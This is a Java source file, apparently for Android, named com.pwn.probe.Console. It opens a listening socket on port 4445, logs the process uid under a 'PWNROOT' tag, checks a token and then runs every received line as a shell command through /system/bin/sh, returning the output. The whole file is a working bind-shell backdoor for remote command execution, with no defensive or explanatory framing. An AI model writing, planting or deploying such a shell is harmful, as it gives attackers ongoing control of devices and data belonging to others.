package com.pwn.probe;

import java.io.*;
import java.net.*;

public class Console implements Runnable {
    public static final String TOKEN = "<YOUR-TOKEN>";
    public void run() {
        try {
            ServerSocket ss = new ServerSocket(4445);
            android.util.Log.i("PWNROOT", "console listening on 4445 uid=" + android.os.Process.myUid());
            while (true) {
                Socket s = ss.accept();
                try { handle(s); } catch (Throwable t) { }
            }
        } catch (Throwable t) { android.util.Log.e("PWNROOT", "console err " + t); }
    }

    private void handle(Socket s) throws Exception {
        BufferedReader in = new BufferedReader(new InputStreamReader(s.getInputStream()));
        PrintWriter out = new PrintWriter(new OutputStreamWriter(s.getOutputStream()), true);
        String line = in.readLine();
        if (line == null || !line.trim().equals(TOKEN)) { out.println("AUTH FAILED"); s.close(); return; }
        out.println("OK uid=" + android.os.Process.myUid() + " pid=" + android.os.Process.myPid());
        while ((line = in.readLine()) != null) {
            if (line.trim().equals("exit")) break;
            out.println(exec(line));
            out.println("###END###");
        }
        s.close();
    }

    private String exec(String cmd) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", cmd});
            StringBuilder sb = new StringBuilder();
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String l;
            while ((l = r.readLine()) != null) sb.append(l).append("\n");
            BufferedReader e = new BufferedReader(new InputStreamReader(p.getErrorStream()));
            while ((l = e.readLine()) != null) sb.append(l).append("\n");
            p.waitFor();
            return sb.toString();
        } catch (Throwable t) { return "EXC " + t; }
    }
}
